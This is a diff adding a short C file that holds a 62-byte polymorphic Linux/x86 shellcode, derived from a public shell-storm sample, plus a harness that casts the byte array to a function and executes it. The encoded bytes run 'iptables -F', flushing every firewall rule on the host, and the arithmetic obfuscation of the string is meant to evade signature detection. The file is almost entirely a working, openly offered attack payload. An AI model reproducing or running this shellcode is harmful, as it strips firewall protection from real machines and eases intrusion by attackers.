@@ -1,0 +1,18 @@
+// Linux/x86 iptables -F
+// Original Shellcode - 43 bytes: http://shell-storm.org/shellcode/files/shellcode-825.php
+// Polymorphic Shellcode - 62 bytes
+// Author: buffered4ever
+// 15-03-2019
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\x29\xc0\x50\x66\x68\x2d\x46\x89\xe6\x50\x68\x62\x6c\x65\x73\xbf\x58\x60\x63\x51\x81\xc7\x11\x10\x11\x10\x89\x7c\x24\xfc\xc7\x44\x24\xf8\x69\x6e\x2f\x2f\xc7\x44\x24\xf4\x2f\x2f\x73\x62\x83\xec\x0c\x89\xe3\x50\x56\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80";
+main()
+{
+	printf("Shellcode Length: %d\n", strlen(code));
+	int (*ret)() = (int(*)())code;
+	ret();
+}
+
